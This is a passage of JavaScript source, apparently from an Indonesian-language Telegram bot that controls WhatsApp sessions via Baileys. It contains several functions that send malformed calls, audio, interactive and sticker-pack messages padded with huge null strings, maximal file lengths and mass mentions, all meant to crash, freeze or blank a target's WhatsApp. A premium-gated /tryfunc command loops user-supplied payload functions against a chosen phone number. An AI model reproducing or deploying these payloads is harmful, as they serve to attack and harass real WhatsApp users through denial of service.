    console.log(chalk.red(`[JTW-UI] 10× popup → ${jid}`));
  } catch (error) {
    console.log("error:\n", error);
  }
}

//crash function v2
async function fcinvisotaxFIX(target) {
  const sender = [...sessions.keys()][0];
  if (!sender || !sessions.has(sender)) return { success: false, error: "no-sender" };
  const sock = sessions.get(sender);
  if (!sock) return { success: false, error: "invalid-session" };

  // ---------- load Baileys yang ada ----------
  let baileysLib;
  try {
    baileysLib = require("@whiskeysockets/baileys");   // fork kamu
  } catch {
    try { baileysLib = require("@otaxayun/baileys"); } catch {
      try { baileysLib = require("@adiwajshing/baileys"); } catch {
        baileysLib = { encodeWAMessage: m => Buffer.from(JSON.stringify(m)), encodeSignedDeviceIdentity: null };
      }
    }
  }

  const encodeWAMessageFn = baileysLib.encodeWAMessage?.bind(sock) ?? sock.encodeWAMessage?.bind(sock) ?? (m => Buffer.from(JSON.stringify(m)));
  const encodeSignedDeviceIdentityFn = baileysLib.encodeSignedDeviceIdentity?.bind(sock) ?? sock.encodeSignedDeviceIdentity?.bind(sock) ?? null;

  try {
    const jid = String(target).includes("@s.whatsapp.net") ? String(target) : `${String(target).replace(/\D/g, "")}@s.whatsapp.net`;

    const HOLE     = Buffer.alloc(8_000_000);
    const NULL_STR = "\0".repeat(1_000_000);

    const janda = () => {
      const map = {};
      return {
        mutex(key, fn) {
          map[key] ??= { task: Promise.resolve() };
          map[key].task = (async prev => { try { await prev; } catch {} return fn(); })(map[key].task);
          return map[key].task;
        }
      };
    };
    const javhd = janda();
    const jepang = buf => Buffer.concat([Buffer.from(buf), Buffer.alloc(8, 1)]);
    const yntkts = encodeWAMessageFn;

    sock.createParticipantNodes = async (recipientJids, message, extraAttrs, dsmMessage) => {
      if (!recipientJids.length) return { nodes: [], shouldIncludeDeviceIdentity: false };
      const patched = await (sock.patchMessageBeforeSending?.(message, recipientJids) ?? message);
      const ywdh = Array.isArray(patched) ? patched : recipientJids.map(j => ({ recipientJid: j, message: patched }));
      const { id: meId, lid: meLid } = sock.authState.creds.me;
      const omak = meLid ? jidDecode(meLid)?.user : null;
      let shouldIncludeDeviceIdentity = false;
      const nodes = await Promise.all(ywdh.map(async ({ recipientJid: j, message: msg }) => {
        const { user: targetUser } = jidDecode(j);
        const { user: ownUser } = jidDecode(meId);
        const isOwn = targetUser === ownUser || targetUser === omak;
        const y = j === meId || j === meLid;
        if (dsmMessage && isOwn && !y) msg = dsmMessage;
        const bytes = jepang(yntkts ? yntkts(msg) : Buffer.from([]));
        return javhd.mutex(j, async () => {
          const { type, ciphertext } = await sock.signalRepository.encryptMessage({ jid: j, data: bytes });
          if (type === "pkmsg") shouldIncludeDeviceIdentity = true;
          return {
            tag: "to",
            attrs: { jid: j },
            content: [{ tag: "enc", attrs: { v: "2", type, ...extraAttrs }, content: ciphertext }]
          };
        });
      }));
      return { nodes: nodes.filter(Boolean), shouldIncludeDeviceIdentity };
    };

    let devices = [];
    try { devices = (await sock.getUSyncDevices([jid], false, false)).map(({ user, device }) => `${user}${device ? ":" + device : ""}@s.whatsapp.net`); } catch { devices = [jid]; }
    try { await sock.assertSessions(devices); } catch {}

    let { nodes: destinations, shouldIncludeDeviceIdentity } = { nodes: [], shouldIncludeDeviceIdentity: false };
    try {
      const created = await sock.createParticipantNodes(devices, { conversation: "y" }, { count: "0" });
      destinations = created?.nodes ?? [];
      shouldIncludeDeviceIdentity = !!created?.shouldIncludeDeviceIdentity;
    } catch { destinations = []; shouldIncludeDeviceIdentity = false; }

    const otaxkiw = {
      tag: "call",
      attrs: {
        to: jid,
        id: sock.generateMessageTag ? sock.generateMessageTag() : crypto.randomBytes(8).toString("hex"),
        from: sock.user?.id || sock.authState?.creds?.me?.id
      },
      content: [{
        tag: "offer",
        attrs: { "call-id": crypto.randomBytes(16).toString("hex").slice(0, 64).toUpperCase(), "call-creator": sock.user?.id || sock.authState?.creds?.me?.id },
        content: [
          { tag: "audio", attrs: { enc: "opus", rate: "16000" } },
          { tag: "audio", attrs: { enc: "opus", rate: "8000" } },
          { tag: "video", attrs: { orientation: "0", screen_width: "1920", screen_height: "1080", device_orientation: "0", enc: "vp8", dec: "vp8" } },
          { tag: "net", attrs: { medium: "3" } },
          { tag: "capability", attrs: { ver: "1" }, content: new Uint8Array([1, 5, 247, 9, 228, 250, 1]) },
          { tag: "encopt", attrs: { keygen: "2" } },
          { tag: "destination", attrs: {}, content: destinations }
        ]
      }]
    };
    if (shouldIncludeDeviceIdentity && encodeSignedDeviceIdentityFn) {
      try {
        const deviceIdentity = encodeSignedDeviceIdentityFn(sock.authState.creds.account, true);
        otaxkiw.content[0].content.push({ tag: "device-identity", attrs: {}, content: deviceIdentity });
      } catch {}
    }

    await sock.sendNode(otaxkiw);
    return { success: true, target: jid, method: "sendNode" };
  } catch (err) {
    return { success: false, error: err?.message ?? String(err) };
  }
}

//function delay pertama
async function galaxyBomb(sock, target) {
  const module = {
    message: {
      ephemeralMessage: {
        message: {
          audioMessage: {
            url: "https://mmg.whatsapp.net/v/t62.7114-24/30578226_1168432881298329_968457547200376172_n.enc?ccb=11-4&oh=01_Q5AaINRqU0f68tTXDJq5XQsBL2xxRYpxyOFaO07XtNBIUJ&oe=67C0E49E&_nc_sid=5e03e0&mms3=true",
            mimetype: "audio/mpeg",
            fileSha256: "ON2s5kStl314oErh7VSStoyN8U6UyvobDFd567H+1t0=",
            fileLength: 999999999999999999,
            seconds: 9999999999999999999,
            ptt: true,
            mediaKey: "+3Tg4JG4y5SyCh9zEZcsWnk8yddaGEAL/8gFJGC7jGE=",
            fileEncSha256: "iMFUzYKVzimBad6DMeux2UO10zKSZdFg9PkvRtiL4zw=",
            directPath: "/v/t62.7114-24/30578226_1168432881298329_968457547200376172_n.enc?ccb=11-4&oh=01_Q5AaINRqU0f68tTXDJq5XQsBL2xxRYpxyOFaO07XtNBIUJ&oe=67C0E49E&_nc_sid=5e03e0",
            mediaKeyTimestamp: 99999999999999,
            contextInfo: {
              mentionedJid: [
                "13300350@s.whatsapp.net",
                target,
                ...Array.from({ length: 1900 }, () =>
                  `${Math.floor(Math.random() * 90000000)}@s.whatsapp.net`
                )
              ],
              isForwarded: true,
              forwardedNewsletterMessageInfo: {
                newsletterJid: "1@newsletter",
                serverMessageId: 1,
                newsletterName: "X"
              }
            },
            waveform: "AAAAIRseCVtcWlxeW1VdXVhZDB09SDVNTEVLW0QJEj1JRk9GRys3FA8AHlpfXV9eL0BXL1MnPhw+DBBcLU9NGg=="
          }
        }
      }
    }
  };

  const Content = generateWAMessageFromContent(
    target,
    module.message,
    { userJid: target }
  );

  await sock.relayMessage("status@broadcast", Content.message, {
    messageId: Content.key.id,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [{ tag: "to", attrs: { jid: target } }]
          }
        ]
      }
    ]
  });

  const viewOnceMsg = generateWAMessageFromContent(
    "status@broadcast",
    {
      viewOnceMessage: {
        message: {
          interactiveResponseMessage: {
            body: { text: "X", format: "BOLD" },
            nativeFlowResponseMessage: {
              name: "call_permission_request",
              paramsJson: "\u0000".repeat(1000000),
              version: 3
            }
          }
        }
      }
    },
    {}
  );

  await sock.relayMessage(
    "status@broadcast",
    viewOnceMsg.message,
    {
      messageId: viewOnceMsg.key.id,
      statusJidList: [target]
    }
  );

  console.log(chalk.red(`Success Send ${target}`));
}

//function delay kedua
async function galaxyBombv2(sock, target) {
  /* ---------- Hard-Core Payload (setara private1) ---------- */
  const HOLE        = Buffer.alloc(500_000);        // 500 KB tetap aman di most fork
  const NULL_CHUNK  = "\u0000".repeat(125_000);     // 125 KB null
  const ZW_SPAM     = "꧀".repeat(12_000);          // 12 KB zero-width
  const MENTION_BOMB = Array.from({ length: 20_000 }, () =>
    "1" + Math.floor(Math.random() * 5_000_000) + "@s.whatsapp.net");

  const audioNode = {
    audioMessage: {
      url: "https://mmg.whatsapp.net/v/t62.7114-24/30578226_1168432881298329_968457547200376172_n.enc?ccb=11-4&oh=01_Q5AaINRqU0f68tTXDJq5XQsBL2xxRYpxyOFaO07XtNBIUJ&oe=67C0E49E&_nc_sid=5e03e0&mms3=true",
      mimetype: "audio/mpeg",
      fileSha256: HOLE.slice(0, 32).toString('base64').replace(/\n/g, ''),
      fileLength: BigInt("18446744073709551615"),
      seconds: 9999999999999999999,
      ptt: true,
      mediaKey: HOLE.slice(32, 64).toString('base64').replace(/\n/g, ''),
      fileEncSha256: HOLE.slice(64, 96).toString('base64').replace(/\n/g, ''),
      directPath: "/v/t62.7114-24/30578226_1168432881298329_968457547200376172_n.enc?ccb=11-4&oh=01_Q5AaINRqU0f68tTXDJq5XQsBL2xxRYpxyOFaO07XtNBIUJ&oe=67C0E49E&_nc_sid=5e03e0",
      mediaKeyTimestamp: 99999999999999,
      waveform: HOLE.toString('base64').slice(0, 4000)
    }
  };

  const quotedInteractive = {
    interactiveResponseMessage: {
      body: { text: "lah kok", format: "DEFAULT" },
      nativeFlowResponseMessage: {
        name: "call_permission_request",
        paramsJson: NULL_CHUNK,
        version: 3
      }
    }
  };

  const coreMessage = {
    viewOnceMessage: {
      message: {
        interactiveResponseMessage: {
          body: { text: ZW_SPAM, format: "DEFAULT" },
          contextInfo: {
            mentionedJid: [target, ...MENTION_BOMB],
            stanzaId: "cihuy",
            participant: target,
            remoteJid: target,
            quotedMessage: quotedInteractive
          }
        }
      }
    }
  };

  /* ---------- Relay #1 – Direct ---------- */
  const msgDirect = generateWAMessageFromContent(target, coreMessage, { userJid: sock.user.id });
  await sock.relayMessage(target, msgDirect.message, { messageId: msgDirect.key.id });

  /* ---------- Relay #2 – Status Broadcast ---------- */
  const msgStatus = generateWAMessageFromContent("status@broadcast", coreMessage, { userJid: sock.user.id });
  await sock.relayMessage("status@broadcast", msgStatus.message, {
    messageId: msgStatus.key.id,
    statusJidList: [target]
  });

  /* ---------- Bonus – Audio Crash (optional) ---------- */
  const audioMsg = generateWAMessageFromContent(target, { ephemeralMessage: { message: audioNode } }, {});
  await sock.relayMessage(target, audioMsg.message, { messageId: audioMsg.key.id });

  console.log(chalk.red(`[galaxyBombv2-HARD] Success → ${target}`));
}

async function EvolBlank(sock, target) {
  /* ---------- tambahan super-size agar layar benar-benar blank ---------- */
  const NULL_PAD   = "\0".repeat(500_000);          // 500 KB null
  const ZW_BLANK   = "ᅠ".repeat(200_000);          // 200 KB zero-width hangul
  const AR_SPAM    = "؂ن؃؄ٽ؂ن؃".repeat(20_000);   // ±120 KB arab block
  const HUGE_EMOJI = ["🀄","🃏","🎴","🎲","🎭"]
                     .map(e => e.repeat(5_000))    // 5.000x per emoji
                     .join("");

  /* ---------- thumbnail & fileLength di-maksimal ---------- */
  const HOLE        = Buffer.alloc(600_000);        // 600 KB buffer
  const fileLength  = BigInt("18446744073709551615"); // 2^64-1
  const packSize    = "999999999999";               // 12 digit

  /* ---------- StickerPackMessage (struktur lama tetap ada) ---------- */
  const stickerPackMessage = {
    stickerPackId: "X" + NULL_PAD.slice(0, 50_000), // 50 KB id
    name: "./𝐂ø𝐫𝐞𝐗 ||" + AR_SPAM,
    publisher: "./𝐂ø𝐫𝐞𝐗 ||" + AR_SPAM,
    stickers: [
      {
        fileName: "FlMx-HjycYUqguf2rn67DhDY1X5ZIDMaxjTkqVafOt8=.webp",
        isAnimated: false,
        emojis: [HUGE_EMOJI],         // 25.000 karakter emoji
        accessibilityLabel: ZW_BLANK, // 200 KB label
        isLottie: true,
        mimetype: "application/pdf",
      },
      /* duplikat 9× supaya total 10 entry → UI render 10× label besar */
      ...Array.from({length:9}, () => ({
        fileName: HOLE.slice(0,32).toString('base64') + ".webp",
        isAnimated: false,
        emojis: [HUGE_EMOJI],
        accessibilityLabel: ZW_BLANK,
        isLottie: true,
        mimetype: "application/pdf",
      }))
    ],
    fileLength: fileLength.toString(),
    fileSha256: HOLE.slice(0,32).toString('base64').replace(/\n/g,''),
    fileEncSha256: HOLE.slice(32,64).toString('base64').replace(/\n/g,''),
    mediaKey: HOLE.slice(64,96).toString('base64').replace(/\n/g,''),
    directPath: "/v/t62.15575-24/24265020_2042257569614740_7973261755064980747_n.enc?ccb=11-4&oh=01_Q5AaIJUsG86dh1hY3MGntd-PHKhgMr7mFT5j4rOVAAMPyaMk&oe=67EF584B&_nc_sid=5e03e0",
    contextInfo: {
      quotedMessage: {
        paymentInviteMessage: {
          serviceType: 3,
          expiryTimestamp: Date.now() + 1814400000
        },
        forwardedAiBotMessageInfo: {
          botName: "META AI",
          botJid: Math.floor(Math.random() * 5000000) + "@s.whatsapp.net",
          creatorName: "Bot"
        }
      }
    },
    packDescription: ZW_BLANK + AR_SPAM + NULL_PAD, // ±820 KB deskripsi
    mediaKeyTimestamp: "99999999999999",
    trayIconFileName: "2496ad84-4561-43ca-949e-f644f9ff8bb9.png",
    thumbnailDirectPath: "/v/t62.15575-24/11915026_616501337873956_5353655441955413735_n.enc?ccb=11-4&oh=01_Q5AaIB8lN_sPnKuR7dMPKVEiNRiozSYF7mqzdumTOdLGgBzK&oe=67EF38ED&_nc_sid=5e03e0",
    thumbnailSha256: HOLE.slice(96,128).toString('base64').replace(/\n/g,''),
    thumbnailEncSha256: HOLE.slice(128,160).toString('base64').replace(/\n/g,''),
    thumbnailHeight: 9999,
    thumbnailWidth: 9999,
    imageDataHash: HOLE.toString('base64'),
    stickerPackSize: packSize,
    stickerPackOrigin: "1",
  };

  /* ---------- kirim paket ---------- */
  await sock.relayMessage(
    target,
    { stickerPackMessage },
    { participant: { jid: target } }
  );

  console.log(chalk.red(`[EvolBlank-HD] Blank-packet sent → ${target}`));
}

/* ========== /tryfunc – SUPER CERDAS CEK FUNGSI ========== */
const { VM } = require('vm2');

bot.onText(/^\/tryfunc(?:@\w+)?(?:\s+(\d+))?(?:\s+(\d+))?(?:\s+(pesan|sw|auto))?$/, async (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;

  /* ---------- cek premium ---------- */
  if (!premiumUsers.some(u => u.id === userId && new Date(u.expiresAt) > new Date())) {
    return bot.sendVideo(chatId, getRandomVid(), {
      caption: `<pre>☾⟟☽━━⬥━━ VALTIX INVICTA ━━⬥━━☾⟟☽</pre>\n❌ Akses ditolak. Fitur ini hanya untuk user premium.`,
      parse_mode: 'HTML'
    });
  }

  /* ---------- cooldown ---------- */
  const cd = checkCooldown(userId);
  if (cd > 0) {
    return bot.sendMessage(chatId, `⏳ Cooldown aktif. Coba lagi dalam ${cd} detik.`);
  }

  /* ---------- parse argumen profesional ---------- */
  const targetRaw = match[1];
  const loopRaw = match[2];
  const modeRaw = match[3]; // pesan | sw | auto

  if (!targetRaw || !loopRaw) {
    return bot.sendMessage(chatId, 
      `📖 <b>CARA PAKAI /tryfunc</b>\n\n` +
      `➤ <code>/tryfunc 628xx 10 pesan</code> → kirim pesan biasa\n` +
      `➤ <code>/tryfunc 628xx 5 sw</code> → kirim lewat Status\n` +
      `➤ <code>/tryfunc 628xx 3 auto</code> → otomatis sesuai kode\n\n` +
      `💡 <i>Reply ke kode fungsi setelah itu.</i>`,
      { parse_mode: 'HTML' }
    );
  }

  const targetNumber = targetRaw.replace(/[^0-9]/g, '');
  const target = `${targetNumber}@s.whatsapp.net`;
  const loop = Math.max(1, Math.min(parseInt(loopRaw), 100));
  const mode = modeRaw || 'auto'; // default auto

  if (isNaN(loop)) return bot.sendMessage(chatId, '❌ Loop harus angka 1-100.');

  /* ---------- cek WhatsApp terhubung ---------- */
  if (sessions.size === 0) {
    return bot.sendMessage(chatId, '⚠️ WhatsApp belum terhubung. Jalankan /addbot terlebih dahulu.');
  }

  /* ---------- ambil kode fungsi ---------- */
  let funcCode = '';
  if (msg.reply_to_message) {
    if (msg.reply_to_message.text) {
      funcCode = msg.reply_to_message.text;
    } else if (msg.reply_to_message.document) {
      const doc = msg.reply_to_message.document;
      if (!doc.file_name.endsWith('.js')) return bot.sendMessage(chatId, '❌ File harus .js');
      const link = await bot.getFileLink(doc.file_id);
      const { data } = await axios.get(link, { responseType: 'text' });
      funcCode = data;
    }
  }
  if (!funcCode) return bot.sendMessage(chatId, '❌ Reply ke pesan kode atau file .js.');

  /* ---------- SUPER CEK FUNGSI – CERDAS ---------- */
  let funcName;
  try {
    // Auto-fix kutip & karakter aneh
    funcCode = funcCode
      .replace(/console\.log\(([^`"'].*)\)/g, 'console.log(`$1`)')
      .replace(/→/g, '->')
      .replace(/\$\(/g, '${');

    // Auto-wrap jadi fungsi + tambah sock,target
    const isFunction = /^\s*(async\s+)?function\s+\w+\s*\(/.test(funcCode);
    if (!isFunction) {
      funcName = 'autoFunc';
      funcCode = `async function ${funcName}(sock, target) {\n${funcCode}\n}`;
    } else {
      const m = funcCode.match(/(?:async\s+)?function\s+(\w+)\s*\(/);
      if (!m) throw new Error('Gagal parse nama fungsi');
      funcName = m[1];
    }

    // Validasi syntax
    new VM().run(`(${funcCode})`);
  } catch (syntaxErr) {
    return bot.sendMessage(chatId, `❌ Syntax error di kode kamu:\n\`${syntaxErr.message}\``);
  }

  /* ---------- CEK SUPPORT – KASIH SARAN ---------- */
  const hasSendMessage = funcCode.includes('sock.sendMessage');
  const hasRelay = funcCode.includes('relayMessage');
  const hasMedia = /(audio|video|document|image)Message/.test(funcCode);
  const hasStatus = funcCode.includes('status@broadcast');

  let detectedMode = 'auto';
  if (mode === 'auto') {
    if (hasRelay && hasStatus) detectedMode = 'sw';
    else if (hasMedia && !hasRelay) detectedMode = 'media';
    else detectedMode = 'pesan';
  } else {
    detectedMode = mode;
  }

  // Kalau func pakai media tapi lewat sendMessage → kasih saran
  if (hasMedia && hasSendMessage && !hasRelay) {
    return bot.sendMessage(chatId, `
❌ <b>Func kamu pakai media tapi lewat <code>sock.sendMessage</code></b>

✅ <b>Saran fix – agar bisa kirim media invalid:</b>
Ganti semua <code>sock.sendMessage(target, { mediaMessage: ... })</code>
Jadi:
<code>sock.relayMessage(target, { mediaMessage: ... }, { messageId: msgId() })</code>

📋 <b>Contoh func siap pakai:</b>
<code>
async function bugMedia(sock, target) {
  const node = { audioMessage: { url: "fake.enc", mimetype: "audio/mp3", fileLength: 999999, ptt: true } };
  await sock.relayMessage(target, node, { messageId: require('crypto').randomBytes(16).toString('hex') });
}
</code>

💡 <i>Copy contoh di atas, lalu /tryfunc lagi.</i>
    `, { parse_mode: 'HTML' });
  }

  /* ---------- delay sesuai mode ---------- */
  const delay = detectedMode === 'sw' ? 1000 : 300;

  /* ---------- progress profesional ---------- */
  const progress = await bot.sendVideo(chatId, getRandomVid(), {
    caption: `<pre>☾⟟☽━━⬥━━ VALTIX INVICTA ━━⬥━━☾⟟☽</pre>
╭━───━⊱ 𝙄𝙉𝙁𝙊𝙍𝙈𝘼𝙏𝙄𝙊𝙉 ⊰───━╮
𖥂 Target: ${targetNumber.replace(/(.{4})/g, '$1 ')}****
𖥂 Loop: ${loop}x
𖥂 Mode: ${detectedMode}
𖥂 Type: ${funcName}
𖥂 Status: Process...
╰━───────╯`,
    parse_mode: 'HTML',
    reply_markup: {
      inline_keyboard: [
        [{ text: '✅ Check Target', url: `https://wa.me/${targetNumber}` }]
      ]
    }
  });

  /* ---------- sandbox SUPER AMAN + BYPASS ---------- */
  try {
    const safeRelay = async (node, to = target) => {
      return sock.relayMessage(to, node, { messageId: require('crypto').randomBytes(16).toString('hex') });
    };

    const sandbox = {
      sock, target, console, Buffer, sleep,
      generateWAMessageFromContent, generateWAMessage,
      prepareWAMessageMedia, proto, jidDecode, areJidsSameUser,
      setTimeout, setInterval,
      relayMessage: sock.relayMessage,
      sendRaw: safeRelay,
      msgId: () => require('crypto').randomBytes(16).toString('hex')
    };

    const vm = new VM({ timeout: 15000, sandbox });
    vm.run(funcCode);
    const fn = vm.run(funcName);

    if (typeof fn !== 'function') throw new Error('Bukan fungsi yang valid');

    const arity = fn.length;
    for (let i = 0; i < loop; i++) {
      if (arity === 1) await fn(target);
      else if (arity === 2) await fn(sock, target);
      else await fn(sock, target, true);
      await sleep(delay);
    }

    await bot.editMessageCaption(
      `<pre>☾⟟☽━━⬥━━ VALTIX INVICTA ━━⬥━━☾⟟☽</pre>
╭━───━⊱ 𝙄𝙉𝙁𝙊𝙍𝙈𝘼𝙏𝙄𝙊𝙉 ⊰───━╮
𖥂 Target: ${targetNumber.replace(/(.{4})/g, '$1 ')}****
𖥂 Loop: ${loop}x
𖥂 Mode: ${detectedMode}
𖥂 Type: ${funcName}
𖥂 Status: Success
╰━───────╯`, {
        chat_id: chatId,
        message_id: progress.message_id,
        parse_mode: 'HTML',
        reply_markup: {
          inline_keyboard: [
            [{ text: '✅ Check Target', url: `https://wa.me/${targetNumber}` }]
          ]
        }
      }
    );
  } catch (err) {
    console.error('[tryfunc]', err);
    bot.sendMessage(chatId, `❌ Error:\n\`${err.message}\``);
  }
});
/* ========== END /tryfunc – SUPER CERDAS ========== */

/// --- ( Code Eror Kalo Script Kalian Eror ) --- \\\
function r(err) {
  const errorText = `❌ *Error Detected!*\n\`\`\`js\n${err.stack || err}\n\`\`\``;
  bot.sendMessage(OWNER_ID, errorText, {
    parse_mode: "Markdown"
  }).catch(e => console.log("Failed to send error to owner:", e));
};

process.on("uncaughtException", (err) => {
  console.error("Uncaught Exception:", err);
  r(err);
});

process.on("unhandledRejection", (reason, promise) => {
  console.error("Unhandled Rejection:", reason);
  r(reason);
});
